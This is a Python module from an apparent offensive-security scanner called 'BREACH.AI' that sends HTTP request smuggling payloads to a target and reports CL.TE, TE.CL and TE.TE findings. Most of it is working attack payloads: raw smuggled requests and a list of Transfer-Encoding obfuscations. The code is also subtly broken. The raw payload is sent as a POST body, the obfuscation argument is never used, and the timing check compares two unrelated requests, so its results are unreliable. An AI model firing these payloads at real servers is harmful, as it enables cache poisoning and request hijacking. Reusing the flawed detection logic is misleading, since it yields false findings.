"""
BREACH.AI - HTTP Request Smuggling Exploiter
=============================================
Detects HTTP request smuggling vulnerabilities.
"""

import asyncio
from typing import List
from .base import BaseAttack, Finding, Severity


class RequestSmuggler(BaseAttack):
    """
    HTTP Request Smuggling Exploiter

    Tests for:
    - CL.TE (Content-Length / Transfer-Encoding)
    - TE.CL (Transfer-Encoding / Content-Length)
    - TE.TE (Transfer-Encoding obfuscation)
    - HTTP/2 downgrade smuggling
    """

    name = "Request Smuggler"

    async def run(self) -> List[Finding]:
        findings = []

        # Test CL.TE
        clte_result = await self._test_clte()
        if clte_result:
            findings.append(clte_result)

        # Test TE.CL
        tecl_result = await self._test_tecl()
        if tecl_result:
            findings.append(tecl_result)

        # Test TE.TE obfuscation
        tete_results = await self._test_tete()
        findings.extend(tete_results)

        return findings

    async def _test_clte(self) -> Finding | None:
        """Test for CL.TE smuggling."""
        # CL.TE: Front-end uses Content-Length, Back-end uses Transfer-Encoding
        payload = (
            "POST / HTTP/1.1\r\n"
            f"Host: {self._get_host()}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 13\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
            "GPOST / HTTP/1.1\r\n"
            f"Host: {self._get_host()}\r\n"
            "\r\n"
        )

        try:
            # Send smuggled request and check for timing/response differences
            response = await self._send_raw(payload)

            # Timing-based detection
            time1 = await self._time_request()
            time2 = await self._time_request()

            if abs(time1 - time2) > 5:  # Significant timing difference
                return Finding(
                    title="HTTP Request Smuggling (CL.TE)",
                    severity=Severity.CRITICAL,
                    category="Request Smuggling",
                    endpoint=self.target,
                    method="POST",
                    description="The server is vulnerable to CL.TE request smuggling. "
                               "The front-end uses Content-Length while the back-end uses Transfer-Encoding.",
                    evidence=f"Timing difference detected: {abs(time1-time2):.2f}s",
                    business_impact=200000,
                    impact_explanation="Request smuggling can be used to bypass security controls, "
                                     "poison caches, steal credentials, and perform request hijacking.",
                    fix_suggestion="Configure the front-end to exclusively use HTTP/2, "
                                 "or normalize Transfer-Encoding headers.",
                    curl_command="Manual testing required with netcat/telnet"
                )
        except Exception:
            pass

        return None

    async def _test_tecl(self) -> Finding | None:
        """Test for TE.CL smuggling."""
        # TE.CL: Front-end uses Transfer-Encoding, Back-end uses Content-Length
        payload = (
            "POST / HTTP/1.1\r\n"
            f"Host: {self._get_host()}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 4\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "5e\r\n"
            "GPOST / HTTP/1.1\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 15\r\n"
            "\r\n"
            "x=1\r\n"
            "0\r\n"
            "\r\n"
        )

        try:
            response = await self._send_raw(payload)

            # Check for 405 Method Not Allowed or similar indicating smuggled request processed
            if response and ("405" in str(response) or "GPOST" in str(response)):
                return Finding(
                    title="HTTP Request Smuggling (TE.CL)",
                    severity=Severity.CRITICAL,
                    category="Request Smuggling",
                    endpoint=self.target,
                    method="POST",
                    description="The server is vulnerable to TE.CL request smuggling.",
                    evidence="Smuggled request was processed",
                    business_impact=200000,
                    impact_explanation="Can bypass security controls and poison caches.",
                    fix_suggestion="Normalize Transfer-Encoding headers at the front-end.",
                    curl_command="Manual testing required"
                )
        except Exception:
            pass

        return None

    async def _test_tete(self) -> List[Finding]:
        """Test for TE.TE with obfuscation."""
        findings = []

        obfuscations = [
            "Transfer-Encoding: xchunked",
            "Transfer-Encoding : chunked",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
            "Transfer-Encoding: chunked\r\nTransfer-encoding: x",
            "Transfer-Encoding:\tchunked",
            "X: X\r\nTransfer-Encoding: chunked",
            "Transfer-Encoding\r\n: chunked",
        ]

        for obf in obfuscations:
            try:
                # Test if the obfuscated TE is processed differently
                response1 = await self._test_obfuscated_te(obf, chunked=True)
                response2 = await self._test_obfuscated_te(obf, chunked=False)

                if response1 and response2 and response1 != response2:
                    findings.append(Finding(
                        title=f"HTTP Request Smuggling (TE.TE Obfuscation)",
                        severity=Severity.HIGH,
                        category="Request Smuggling",
                        endpoint=self.target,
                        method="POST",
                        description=f"Server processes obfuscated Transfer-Encoding differently: {obf}",
                        evidence=f"Obfuscation: {obf}",
                        business_impact=150000,
                        impact_explanation="TE.TE vulnerabilities can be exploited for smuggling.",
                        fix_suggestion="Strictly parse Transfer-Encoding headers.",
                        curl_command="Manual testing required"
                    ))
                    break

            except Exception:
                continue

        return findings

    async def _send_raw(self, payload: str) -> str | None:
        """Send raw HTTP request."""
        # This is a simplified version - real implementation would use raw sockets
        try:
            response = await self.client.post(
                self.target,
                content=payload.encode(),
                headers={"Content-Type": "application/x-www-form-urlencoded"}
            )
            return response.text
        except Exception:
            return None

    async def _time_request(self) -> float:
        """Time a request."""
        import time
        start = time.time()
        try:
            await self.client.get(self.target)
        except Exception:
            pass
        return time.time() - start

    async def _test_obfuscated_te(self, obfuscation: str, chunked: bool) -> str | None:
        """Test obfuscated Transfer-Encoding."""
        try:
            if chunked:
                response = await self.client.post(
                    self.target,
                    content=b"0\r\n\r\n",
                    headers={"Transfer-Encoding": "chunked"}
                )
            else:
                response = await self.client.post(
                    self.target,
                    content=b"test",
                    headers={"Content-Length": "4"}
                )
            return response.text[:100]
        except Exception:
            return None

    def _get_host(self) -> str:
        """Extract host from target URL."""
        from urllib.parse import urlparse
        return urlparse(self.target).netloc
